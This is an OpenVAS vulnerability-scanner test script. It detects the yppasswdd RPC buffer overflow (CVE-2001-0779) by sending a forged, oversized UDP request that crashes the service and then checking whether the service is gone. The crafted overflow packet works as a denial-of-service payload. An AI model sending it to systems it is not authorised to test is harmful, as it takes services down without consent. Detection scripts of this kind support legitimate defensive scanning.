###############################################################################
# OpenVAS Vulnerability Test
# $Id: yppasswdd.nasl 13158 2019-01-18 16:03:13Z cfischer $
#
# yppasswdd overflow
#
# Authors:
# Renaud Deraison <deraison@cvs.nessus.org>
#
# Copyright:
# Copyright (C) 2001 Renaud Deraison
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80035");
  script_version("$Revision: 13158 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-18 17:03:13 +0100 (Fri, 18 Jan 2019) $");
  script_tag(name:"creation_date", value:"2008-10-24 20:15:31 +0200 (Fri, 24 Oct 2008)");
  script_bugtraq_id(2763);
  script_cve_id("CVE-2001-0779");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("yppasswdd overflow");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2001 Renaud Deraison");
  script_family("Gain a shell remotely");
  script_dependencies("secpod_rpc_portmap_tcp.nasl");
  script_require_keys("rpc/portmap");

  script_tag(name:"solution", value:"disable this service if you don't use
  26 it, or contact Sun for a patch");

  script_tag(name:"summary", value:"The remote RPC service 100009 (yppasswdd) is vulnerable
  to a buffer overflow which allows any user to obtain a root shell on this host.");

  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("misc_func.inc");
include("byte_func.inc");

port = get_rpc_port(program:100009, protocol:IPPROTO_UDP);
if(!port)
  exit(0);

if(!get_udp_port_state(port))
  exit(0);

soc = open_sock_udp(port);
if(!soc)
  exit(0);

# nb: We forge a bogus RPC request, with a way too long argument. The remote process will die immediately, and hopefully painlessly.
crp = crap(796);

req = raw_string(0x56, 0x6C, 0x9F, 0x6B,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
                 0x00, 0x01, 0x86, 0xA9, 0x00, 0x00, 0x00, 0x01,
                 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x03, 0x20, 0x80, 0x1C, 0x40, 0x11) +
      crp +
      raw_string(0x00, 0x00, 0x00, 0x02,
                 0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03,
                 0x61, 0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x03,
                 0x61, 0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x02,
                 0x61, 0x61, 0x00, 0x00);
send(socket:soc, data:req);
r = recv(socket:soc, length:4096);
close(soc);

if(r) {

  # nb: if length(r) == 28, then the overflow did succeed. However, I prefer to re-make a call to getrpcport(), that's safer (who knows what exotic yppasswdd can reply ?)
  sleep(1);
  newport = get_rpc_port(program:100009, protocol:IPPROTO_UDP);
  set_kb_item(name:"rpc/yppasswd/sun_overflow", value:TRUE);
  if(!newport)
    security_message(port:port, protocol:"udp");
}

exit(0);